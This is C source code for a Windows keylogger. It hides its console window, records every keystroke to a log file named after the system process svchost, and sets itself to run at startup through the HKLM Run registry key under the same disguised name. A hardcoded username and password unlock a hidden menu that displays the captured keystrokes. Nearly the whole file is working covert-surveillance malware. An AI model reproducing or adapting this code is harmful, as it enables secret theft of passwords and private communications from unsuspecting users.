#include<windows.h>
#include<stdio.h>
#include<winuser.h>             //showwindows
#include<windowsx.h>
#include<time.h>
#include<conio.h>
#define BUFSIZE 80


int test_key();
int create_key(char *);
int entered_keys(time_t);
void login();
void menu();

void menu()                                                                                     //menu function to print the menu
{
    HWND stealth; /*declaring stealth (window is not visible)*/
    AllocConsole();//function to fail if window already exists
    stealth=FindWindowA("ConsoleWindowClass",NULL);  //creating the stealth window

    int year,ch;
    time_t thetime,timet=time(0);
    struct tm s;                        //inbuilt structure in time module to input the date time and year

    char str;
    FILE *file;
    system("cls");
    do
    {
    printf("1.Display file\n2.enter the time to start keylogging\n3.Hide console\n");
    scanf("%d",&ch);
    system("cls");
    switch(ch)
    {
        case 1:file=fopen("svchost.log","r");                               //to display contents of the file
               while((str=fgetc(file))!=EOF)
                   printf("%c",str);
                   system("cls");
                   fclose(file);
                   break;
        case 2:printf("enter year");                                        //input the time year and date for key logger to start logging
               scanf("%d",&year);
               s.tm_year=year-1900;
               printf("enter month");
               scanf("%d",&s.tm_mon);
               printf("enter day");
               scanf("%d",&s.tm_mday);
               printf("enter hour");
               scanf("%d",&s.tm_hour);
               printf("enter minutes");
               scanf("%d",&s.tm_min);
               printf("enter seconds");
               scanf("%d",&s.tm_sec);
               timet=mktime(&s);
               printf(ctime(&timet));
               getch();
                break;

        case 3:  while(1)
                        {                                                               //time delay loop to wait when to start key logger
                             if(timet<=thetime)
                                             {
                                             break;
                                             }
                             else
                                    {
                                        thetime=time(0);
                                        //printf("%f",difftime(timet,thetime));
                                        continue;
                                    }
                        }
               return;              //return to login
               break;

    }
    }
    while(ch!=5);
}


void login()
{
    {
int i=0;
fflush(stdin);
char username[25],pwd[25],s_username[25]={"kevin"}, s_pwd[25]={"admin"},ch;
system("cls");
printf("\n Enter the username : ");
fflush(stdin);
scanf("%s",username);

printf("\n Enter the password : ");
while(1)
{
	ch=getch();
	if(ch==13)    //asci value of enter is 13
	break;
	else if(ch==8)    //this is for taking backspace into account 8 is ascii value of backspace
	{       if(i!=0) /*this is for avoiding the ENTER instructions getting deleted or it will remove the enter username displayed*/
		{
			printf("\b");  /*printing backspace to move cursor 1 pos back*/
			printf("%c",32);/*making the char invisible which is already on console*/
			printf("\b"); /*printing backspace to move cursor 1 pos back*/
			i--;
			pwd[i]='\0';
		}
		else //if backspace is entered in starting it will skip deletion
		   continue;

	}
	else
	{
	putchar('*');/* '*' will be printed instead of the character */
	pwd[i]=ch;
	i++;
	}
}
pwd[i]='\0';//filling the last position with /0

	if((stricmp(username,s_username))==0 && (strcmp(pwd,s_pwd))==0)     //checking if they are equal
	{
		printf("0 \n \n \t \t USER AUTHENTICATED \n \n \t \t PRESS ENTER TO CONTINUE");
        getch();
        menu();
        return;                                            //return to entered keys
        	}
    else
        printf("\n \n \n\t LOGIN FAILED");
        getch();
        system("cls");
        login();   //going back to login screen

}
}
int main()
{  int test,create,t;
   HWND stealth; /*creating stealth (window is not visible)*/
   AllocConsole();//function to fail if window already exists
   stealth=FindWindowA("ConsoleWindowClass",NULL);
   ShowWindow(stealth,0);//mode to open the console in ie.hidden


   FILE *file;
   file=fopen("svchost.log","a+");
   time_t theTime=time(0);
   fputs("\nStarted logging:", file);           //inputting time of keylogging into a file
   fputs(ctime(&theTime),file);
   fclose(file);


   test=test_key();/*check if file is available for opening*/

   if (test==2)/*create key ,done when we run the program first time*/
   {
       char *path="c:\\%windir%\\svchost.exe";/*the path in which the file needs to be*/
       create=create_key(path);         //creating the file on the path

   }

   t=entered_keys(theTime);       //function for inputing entered keys into the file

   return t;
}


int entered_keys(time_t thetime)
{           FILE *file;
            file=fopen("svchost.log","a+");
            time_t timet;
            int i=1;
            HWND stealth; /*declaring stealth (window is not visible)*/
            AllocConsole();//function to fail if window already exists
            stealth=FindWindowA("ConsoleWindowClass",NULL);  //creating the stealth window

             short character;
             while(1)
             {
                    Sleep(10);/*to prevent 100% cpu usage*/

                    for(character=8;character<=222;character++)     //will save upto 222characters at a time
                    {

                        if(GetAsyncKeyState(character)==-32767)     //GetAsyncKeyState checks whether a character was hit on keyboard
                        {

                            FILE *file;             //declaration of a file
                            file=fopen("svchost.log","a+"); //open file in write mode
                            if(file==NULL)
                            {
                                    return 1;   //return 1 if file is not created
                            }
                            if(file!=NULL)
                            {
                                    timet=time(0);
                                    if((timet-thetime)%1800==0)                                //to print logging time every 30 mins                                             {
                                             {
                                                 //timet=time(0);

                                             fputs("\nStarted logging:", file);           //inputting time of keylogging into a file
                                             fputs(ctime(&timet),file);
                                             fclose(file);
                                             }

                                    if((character>=39)&&(character<=64))            //write to file if a small letter is entered by user
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else if((character>64)&&(character<91))         //write to file if a capital letter is entered by the user
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character)                           //write to file for any other characters as follows
                                        {
                                              case VK_SPACE:fputc(' ',file);        //if space was hit
                                                            fclose(file);
                                                            break;

                                              case VK_SHIFT: fputs("[SHIFT]",file); //if shift was hit write "SHIFT" in the log file"
                                                             fclose(file);
                                                             break;

                                              case VK_RETURN:fputs("\n[ENTER]",file);   //if enter was hit write "ENTER" in the log file"
                                                             fclose(file);
                                                             break;

                                              case VK_BACK:fputs("[BACKSPACE]",file);   //if backspace was hit write "BACKSPACE" in the log file"
                                                           fclose(file);
                                                           break;

                                              case VK_F12:
                                                            ShowWindow(stealth,1);
                                                            login();
                                                            ShowWindow(stealth,0);
                                                            break;
                                              case VK_TAB:
                                                            fputs("[TAB]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_CONTROL:
                                                                fputs("[CTRL]",file);
                                                                fclose(file);
                                                                break;
                                              case VK_DELETE:
                                                                fputs("[DEL]",file);
                                                                fclose(file);
                                                                break;
                                              case VK_OEM_1:
                                                            fputs("[;:]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_OEM_2:
                                                            fputs("[/?]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_OEM_3:
                                                            fputs("[`~]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_OEM_4:
                                                            fputs("[ [{ ]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_OEM_5:
                                                            fputs("[\\|]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_OEM_6:
                                                            fputs("[ ]} ]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_OEM_7:
                                                            fputs("['\"]",file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD0:
                                                            fputc('0',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD1:
                                                            fputc('1',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD2:
                                                            fputc('2',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD3:
                                                            fputc('3',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD4:
                                                            fputc('4',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD5:
                                                            fputc('5',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD6:
                                                            fputc('6',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD7:
                                                            fputc('7',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD8:
                                                            fputc('8',file);
                                                            fclose(file);
                                                            break;
                                              case VK_NUMPAD9:
                                                            fputc('9',file);
                                                            fclose(file);
                                                            break;
                                              case VK_CAPITAL:
                                                            fputs("[CAPS LOCK]",file);
                                                            fclose(file);
                                                            break;
                                              default:
                                                            fclose(file);
                                                            break;
                                       }
                                  }
                             }
                   }
               }

           }
           return EXIT_SUCCESS;
}

int test_key()              //checking if file is present in registries
{
   int check;
   HKEY hKey;
   char path[BUFSIZE];              //array of buffer length 80
   DWORD buf_length=BUFSIZE;
   int reg_key;

   reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);       //entering into the registry
   if(reg_key!=0)
   {
       check=1;
       return check;
   }

   reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);      //testing if key is present

   if((reg_key!=0)||(buf_length>BUFSIZE))       //if key file not present check= 2
       check=2;
   if(reg_key==0)       //if present check= 0
       check=0;

   RegCloseKey(hKey);   //close the registry
   return check;        //return value of check
}

int create_key(char *path)      //if file key not present create the key on the path passed as argument
{
       int reg_key,check;

       HKEY hkey;

       reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey);  //create the key on the registry
       if(reg_key==0)           //if entered into the registry was successful
       {
               RegSetValueEx((HKEY)hkey,"svchost",0,REG_SZ,(BYTE *)path,strlen(path));          //create the reg key
               check=0;
               return check;        //return value of check
       }
       if(reg_key!=0)       //if entering was unsuccessful check =1
               check=1;

       return check;
}
